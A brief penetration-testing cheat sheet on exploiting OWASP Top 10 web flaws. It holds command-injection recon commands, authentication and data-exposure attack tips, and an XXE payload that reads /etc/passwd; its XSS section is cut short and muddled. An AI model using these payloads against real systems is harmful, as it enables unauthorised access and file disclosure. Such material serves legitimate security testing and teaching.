# Intro

This is a cheat sheet for exploitation of OWASP Top 10.

It is the followed by more refined attacks. 

# OWASP Top 10

## Command Injection

If Backend has an insecure function that passes user input directly to shell, it can be exploited.

Try injecting the following:
```
# Linux

whoami
id
ifconfig/ip addr
uname -a
ps -ef


# Windows

whoami
ver
ipconfig
tasklist
netstat -an
```

For bypassing WAF and more advanced injections your best friend is as always: Payload all the thins.

## Broken Authentication

If an attacker is able to find flaws in an authentication mechanism, they would then successfully gain access to other usersâ€™ accounts.

1. Try manipulating session cookies to see if they are predictable
2. Manipulate GET requests containing IDs or usernames
3. Register as user with similar name: add space " admin" or numbers

## Sensitive Data Exposure

1. Search web source code
2. Dirbust for hidden files
3. Dork with Google or Github
4. Try downloading db files with command injection

## XXE injection

It arises from exploiting parsing of ENTITY element. It can be prevented by smart conding practices depending on language used: https://brightsec.com/blog/xxe-prevention/

For payloads refer to: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#exploiting-xxe-to-retrieve-files

1. Detect XXE
```
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo>
```
2. Exploit 
`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>`

## Security Misconfigurations

* Accessible S3 Buckets
* Non functional additional features enabled: like status pages, accounts or privileges
* Default credentials
* Verbose error messages disclosing system properties
* Not using HTTP and cookies security headers
* Non patched systems

## XXS

1. Detect XXS

Use print() instead or use only firefox browser for testing. But this would fail if user uses Chrome and its derivates.
